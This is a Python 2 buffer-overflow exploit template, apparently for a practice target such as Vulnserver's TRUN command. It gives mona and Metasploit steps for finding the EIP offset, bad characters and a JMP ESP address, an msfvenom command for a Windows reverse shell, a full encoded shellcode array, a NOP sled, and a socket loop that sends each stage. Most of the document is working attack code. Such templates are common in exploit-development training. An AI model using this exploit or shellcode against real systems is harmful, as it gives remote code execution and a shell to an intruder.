#!/bin/python2
import sys, socket
from time import sleep

# --------------------------------------------------------------------------------------------------------------------
'''
optional : !mona config -set workingfolder c:\mona\%p

generate cyclic pattern:
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <LENGTH>
 OR !mona pc <LENGTH>

find offset (EIP):
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <LENGTH> -q <OFFSET>
 OR !mona po EIP

identify bad chars - follow dump on ESP_addr, check for bad chars (excluding known bad char \x00 which will trunc shellcode)
 !mona bytearray -cpb "<\x00>"
 !mona compare -f bytearray.bin_path -a ESP_addr
 
finding the right module w/o memory protection (aslr, dep, safeseh ...)
 !mona modules (find vulnerable module within exe, note module name)
 locate nasm-shell (get opcode for JMP ESP)
 > JMP ESP : ffe4
 !mona find -s "\xff\xe4" -m module_name
 OR !mona jmp -r esp -cpb "<\x00>"
 note addr of JMP ESP in unprotected module
 modify EIP to addr above in script payload (32 bit - little endian is used, address has to be in reverse)
 set breakpoint in immunity @ addr above, test if execution stops on breakpoint
 
generate shellcode payload
 msfvenom -l payload | grep <PLATFORM>
 msfvenom -p <payload_path> LHOST=<host> LPORT=<port> EXITFUNC=thread -f c -a x86 -b "<\x00>"
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -f c
 replace shellcode variable & take note of payload size - check remaining buffer size
 start listener on host @ specified port
 '''
# --------------------------------------------------------------------------------------------------------------------

# edit as required -----
ipaddr = '192.168.1.107'
port = 9999
# ----------------------
'''
buffer = "A"*100
pattern = ""
'''
offset = 0
# ----------------------
'''
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F"
"\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF"
"\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF"
"\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF"
"\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF"
"\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF"
"\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF")
checkeip = "A"*offset + "B"*4 + badchars
'''
# ----------------------
'''
# Address=625011AF
eipaddr = ""
nopsled = "\x90"*32
shellcode = ("\xdb\xcc\xd9\x74\x24\xf4\x5d\xbb\x01\x78\x98\x7a\x2b\xc9\xb1"
"\x52\x31\x5d\x17\x03\x5d\x17\x83\xec\x84\x7a\x8f\x12\x9c\xf9"
"\x70\xea\x5d\x9e\xf9\x0f\x6c\x9e\x9e\x44\xdf\x2e\xd4\x08\xec"
"\xc5\xb8\xb8\x67\xab\x14\xcf\xc0\x06\x43\xfe\xd1\x3b\xb7\x61"
"\x52\x46\xe4\x41\x6b\x89\xf9\x80\xac\xf4\xf0\xd0\x65\x72\xa6"
"\xc4\x02\xce\x7b\x6f\x58\xde\xfb\x8c\x29\xe1\x2a\x03\x21\xb8"
"\xec\xa2\xe6\xb0\xa4\xbc\xeb\xfd\x7f\x37\xdf\x8a\x81\x91\x11"
"\x72\x2d\xdc\x9d\x81\x2f\x19\x19\x7a\x5a\x53\x59\x07\x5d\xa0"
"\x23\xd3\xe8\x32\x83\x90\x4b\x9e\x35\x74\x0d\x55\x39\x31\x59"
"\x31\x5e\xc4\x8e\x4a\x5a\x4d\x31\x9c\xea\x15\x16\x38\xb6\xce"
"\x37\x19\x12\xa0\x48\x79\xfd\x1d\xed\xf2\x10\x49\x9c\x59\x7d"
"\xbe\xad\x61\x7d\xa8\xa6\x12\x4f\x77\x1d\xbc\xe3\xf0\xbb\x3b"
"\x03\x2b\x7b\xd3\xfa\xd4\x7c\xfa\x38\x80\x2c\x94\xe9\xa9\xa6"
"\x64\x15\x7c\x68\x34\xb9\x2f\xc9\xe4\x79\x80\xa1\xee\x75\xff"
"\xd2\x11\x5c\x68\x78\xe8\x37\x57\xd5\xf3\xab\x3f\x24\xf3\x22"
"\x9c\xa1\x15\x2e\x0c\xe4\x8e\xc7\xb5\xad\x44\x79\x39\x78\x21"
"\xb9\xb1\x8f\xd6\x74\x32\xe5\xc4\xe1\xb2\xb0\xb6\xa4\xcd\x6e"
"\xde\x2b\x5f\xf5\x1e\x25\x7c\xa2\x49\x62\xb2\xbb\x1f\x9e\xed"
"\x15\x3d\x63\x6b\x5d\x85\xb8\x48\x60\x04\x4c\xf4\x46\x16\x88"
"\xf5\xc2\x42\x44\xa0\x9c\x3c\x22\x1a\x6f\x96\xfc\xf1\x39\x7e"
"\x78\x3a\xfa\xf8\x85\x17\x8c\xe4\x34\xce\xc9\x1b\xf8\x86\xdd"
"\x64\xe4\x36\x21\xbf\xac\x47\x68\x9d\x85\xcf\x35\x74\x94\x8d"
"\xc5\xa3\xdb\xab\x45\x41\xa4\x4f\x55\x20\xa1\x14\xd1\xd9\xdb"
"\x05\xb4\xdd\x48\x25\x9d")
payload = "\x90"*offset + eipaddr + nopsled + shellcode
'''
# ----------------------

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ipaddr, port))
		'''
        	#check eax register for weird characters appended by application (if any), test w/o debugger attached
		s.send(('TRUN /.:/' + buffer))
		print "Sending %s bytes..." % str(len(buffer))
		s.close()
       		sleep(1)
		buffer = buffer + "A"*100
		'''
		'''		
		#generate cyclic pattern of crashed buffer length (ceiling)
		s.send(('TRUN /.:/' + pattern))
		s.close()
		print "Sent cyclic pattern!"
		break
		'''
		'''
		#update payload with offset to check if eip is updated + check for bad characters
		s.send(('TRUN /.:/' + checkeip))
		s.close()
		print "Sent eip + badchar check!"
		break
		'''
		'''
		#send payload with return addr to nopsled and reverse shell (w/o debugger attached)
		s.send(('TRUN /.:/' + payload))
		s.close()
		print "Sent payload!"
		break		
		'''
	except:
		print "Error connecting to server!"
		sys.exit()
